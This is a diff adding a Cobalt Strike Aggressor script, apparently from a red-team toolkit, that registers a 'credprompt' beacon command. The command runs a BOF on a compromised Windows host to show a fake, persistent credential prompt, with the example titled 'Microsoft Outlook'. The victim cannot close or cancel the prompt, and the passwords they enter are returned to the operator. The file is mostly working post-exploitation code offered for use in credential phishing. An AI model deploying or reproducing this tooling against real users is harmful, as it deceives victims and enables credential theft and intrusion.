@@ -1,0 +1,36 @@
+# author REDMED-X
+
+beacon_command_register(
+	"credprompt", "Start custom Windows credential prompt.",
+	"INFO:\nStart Windows credential prompt in an attempt to capture user credentials. Entered credentials are returned as output. The prompt is persistent so the victim can't cancel/close the prompt or enter an empty password. Any user attempt to do so is shown in the output. Finally, a timer for the prompt is set to make sure the beacon will return at some point.\n\n" .
+	"ARGUMENTS:\n[<title>]: a custom window title.\n[<message>]: a custom message set in the window.\n[<timer>]: number in seconds after how long the prompt should auto close. Default is set to 60.\n\n" .
+	"USAGE:\ncredprompt <title> <message> <(optional) timer>\n\n" .
+	"EXAMPLES:\ncredprompt \"Microsoft Outlook\" \"Connecting to user@example.com\" 60\n\n");
+	
+alias credprompt {
+    $bid = $1;
+	$title = $2;
+    $message = $3;
+	$timer = $4;
+	
+	if ($title eq "") {
+		berror($bid, "Please give the window a custom title.\n");
+		return;
+	}
+
+	if ($message eq "") {
+		berror($bid, "Please give the window a custom message.\n");
+		return;
+	}
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("credprompt.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data = bof_pack($bid, "ZZi", $title, $message, $timer);
+
+	blog($bid, "Tasked to start a credential prompt..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
